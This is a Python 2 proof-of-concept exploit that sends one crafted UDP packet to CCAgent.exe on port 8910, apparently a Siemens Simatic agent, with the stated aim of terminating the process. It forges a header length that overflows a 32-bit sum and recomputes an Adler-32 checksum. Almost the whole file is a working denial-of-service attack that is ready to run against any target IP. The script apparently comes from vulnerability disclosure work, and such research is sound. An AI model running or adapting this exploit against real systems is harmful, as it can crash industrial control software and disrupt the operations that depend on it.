import argparse, sys, socket, string, zlib, time

# Got it from the Internet 
def hexdump(src, length=16):
  DISPLAY = string.digits + string.letters + string.punctuation
  FILTER = ''.join(((x if x in DISPLAY else '.') for x in map(chr, range(256))))
  lines = []
  for c in xrange(0, len(src), length):
    chars = src[c:c+length]
    hex = ' '.join(["%02x" % ord(x) for x in chars])
    if len(hex) > 24:
      hex = "%s %s" % (hex[:24], hex[24:])
    printable = ''.join(["%s" % FILTER[ord(x)] for x in chars])
    lines.append("%08x:  %-*s  %s\n" % (c, length*3, hex, printable))
  return ''.join(lines)

def dump(title, data):
  print '--- [ %s ] --- ' % (title)
  print hexdump(data) 

#
# MAIN
#
desc = 'This PoC attempts to terminate CCAgent.exe.'

arg_parser = argparse.ArgumentParser(desc)
arg_parser.add_argument('-t', required=True, help='Target IP (Required)')
arg_parser.add_argument('-p', type=int, default=8910, help='CCAgent.exe UDP port, default: 8910')

args = arg_parser.parse_args()
host = args.t
port = args.p

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# (int32)(h + cs) = 0x73
h = 0x74    
cs = 0xffffffff

msg  = 'scs_v~$%02d_%2s_%2s_cr%04X_ck%08x_h%02X_c%1d_cs%08X_us%08X_t%016X_c%016X' % (2,'mc', 'ci', 2, 0, h, 0, cs, 0x1000, int(time.time()), 0xffffffff00000001)  

msg  += '\x00' * (((h + cs) & 0xffffffff) - len(msg))
chksum = '%08x' % (zlib.adler32(msg[0x22:]))
msg = msg[:25] + chksum + msg[33:]

dump('msg', msg)
s.sendto(msg,(host, port))

print 'Did CCAgent.exe die?'
print "Make sure turning on 'Encrypted communication' in Simatic Shell."

